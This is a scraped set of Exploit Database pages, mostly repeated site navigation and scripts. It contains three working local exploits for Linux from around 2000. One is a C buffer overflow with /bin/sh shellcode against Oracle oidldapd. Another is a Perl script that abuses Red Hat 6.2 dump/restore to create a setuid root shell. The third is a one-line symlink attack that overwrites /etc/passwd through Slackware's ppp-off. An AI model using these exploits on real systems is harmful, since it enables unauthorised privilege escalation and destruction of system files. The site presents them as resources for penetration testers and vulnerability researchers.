person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 183
Oracle (oidldapd connect) - Local Command Line Overflow - Linux local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDOracle (oidldapd connect) - Local Command Line OverflowEDB-ID:183CVE:2000-0987EDB Verified:Author:anonymousType:localExploit:/Platform:LinuxDate:2000-11-16Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*Exploit Code for oidldapd in Oracle 8.1.6 (8ir2) for Linux.I tested in RH 6.2 and 6.1. This code is a bullshit (i knowplease no comments about ;-)).If someone exports this to Sparc please tell me.synopsis: buffer overflow in oidldapdimpact: any user gain euid=oracle.Dedicated to PlazaSite guys. Klink Klink Team. Panxeta, Entrophy and others.*/#include <stdio.h>#include <stdlib.h>#define DEFAULT_OFFSET		13#define DEFAULT_BUFFER_SIZE	700#define NOP				0x90#define ORACLE_HOME		"/usr/local/oracle/app/oracle/product/8.1.6"char shellcode[] ="\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b""\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd""\x80\xe8\xdc\xff\xff\xff/bin/sh";unsigned long get_sp(void) {__asm__("movl %esp,%eax");}void main(int argc, char *argv[]) {char *buff, *ptr,*name[3],environ[100],binary[120];long *addr_ptr, addr;int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;int i;buff = malloc(bsize);addr = get_sp() - offset;ptr = buff;addr_ptr = (long *) ptr;for (i = 0; i < bsize; i+=4)*(addr_ptr++) = addr;for (i = 0; i < bsize/2; i++)buff[i] = NOP;ptr = buff + ((bsize/2) - (strlen(shellcode)/2));for (i = 0; i < strlen(shellcode); i++)*(ptr++) = shellcode[i];buff[bsize - 1] = '\0';memcpy(buff,"EGG=",4);putenv(buff);sprintf(environ,"ORACLE_HOME=%s",ORACLE_HOME);putenv(environ);sprintf(binary,"%s/bin/oidldapd connect=$EGG",ORACLE_HOME);system(binary);}// milw0rm.com [2000-11-16]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 184
RedHat 6.2 Restore and Dump - Local Privilege Escalation (Perl) - Linux local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDRedHat 6.2 Restore and Dump - Local Privilege Escalation (Perl)EDB-ID:184CVE:2000-1125EDB Verified:Author:TlabsType:localExploit:/Platform:LinuxDate:2000-11-16Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/usr/bin/perl# perl exploit of restore and dump# redhat linux 6.2# written by tlabs# Use at your discretion$EXPORT1="TAPE=garbage:garbage" ;$EXPORT2="RSH=./hey" ;sub USAGE{print "$0 <type>\n1=dump 2=dump.static 3=restore 4=restore.staic\nYour choice innit;)\nWritten by Tlabs\n" ;exit 0 ;}sub ERROR{print "$_[0]\n" ;exit 0 ;}open(TEMP, ">shell.c")|| ERROR("Something went wrong:$!");printf TEMP "#include<unistd.h>\n#include<stdlib.h>\nint main()\n{" ;printf TEMP "    setuid(0);\n\tsetgid(0);\n\texecl(\"/bin/sh\",\"sh\",0);\n\treturn 0;\n}" ;close(TEMP);system "cc -o shell shell.c" ;unlink "shell.c" ;open(TEMP1, ">hey")|| ERROR("Something went wrong: $!");printf TEMP1 "#!/bin/sh\nchown root shell\nchmod 4755 shell" ;close(TEMP1);chmod(0755, "hey");if ($ARGV[$0] eq "1"){$DUMPER="/sbin/dump" ;if ( -u "$DUMPER" ){system "export $EXPORT1 ;export $EXPORT2 ; $DUMPER -0 \/" ;sleep(3);if ( -u "shell" ){unlink "hey" ;system "./shell" ;}else{unlink "hey" ;unlink "shell" ;print "Something fucked at the last, sorry" ;}}else{unlink "hey" ;unlink "shell" ;printf "Dump is not exploitable on this system\n";}}elsif ($ARGV[$0] eq "2"){$DUMPER="/sbin/dump.static" ;if ( -u "$DUMPER" ){system "export $EXPORT1 ;export $EXPORT2 ; $DUMPER -0 \/" ;sleep(3);if ( -u "shell" ){unlink "hey" ;system "./shell" ;}else{unlink "hey" ;unlink "shell" ;print "Something fucked at the last, sorry" ;}}else{unlink "hey" ;unlink "shell" ;printf "Dump.static is not exploitable on this system\n";}}elsif ($ARGV[$0] eq "3"){$RESTORER="/sbin/restore" ;if ( -u "$RESTORER" ){system "export $EXPORT1 ; export $EXPORT2 ; $RESTORER -i" ;sleep(3);if ( -u "shell" ){unlink "hey" ;system "./shell" ;}else{unlink "hey" ;unlink "shell" ;print "Something fucked at the last, sorry" ;}}else{unlink "hey" ;unlink "shell" ;printf "Restore is not exploitable on this system\n";}}elsif ($ARGV[$0] eq "4"){$RESTORER="/sbin/restore.static" ;if ( -u "$RESTORER" ){system "export $EXPORT1 ; export $EXPORT2 ; $RESTORER -i" ;sleep(3);if ( -u "shell" ){unlink "hey" ;system "./shell" ;}else{unlink "hey" ;unlink "shell" ;print "Something fucked at the last, sorry" ;}}else{unlink "hey" ;unlink "shell" ;printf "Restore.static is not exploitable on this system\n";}}else{USAGE ;}# milw0rm.com [2000-11-16]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 185
Slackware Linux - '/usr/bin/ppp-off' Insecure /tmp Call - Linux dos Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDSlackware Linux - '/usr/bin/ppp-off' Insecure /tmp CallEDB-ID:185CVE:EDB Verified:Author:sinfonyType:dosExploit:/Platform:LinuxDate:2000-11-17Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/bin/sh## In SlackWare Linux the script /usr/bin/ppp-off writes the# output of 'ps x' to /tmp/grep.tmp. Since root is the user# that runs ppp-off,  a non-privileged  user could create a# link from /tmp/grep.tmp to any file(ie: /etc/issue), thus# when root runs the  ppp-off script, the  output of 'ps x'# would be put in the linked file.#                                                   sinfonyln -s /etc/passwd /tmp/grep.tmp# milw0rm.com [2000-11-17]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due 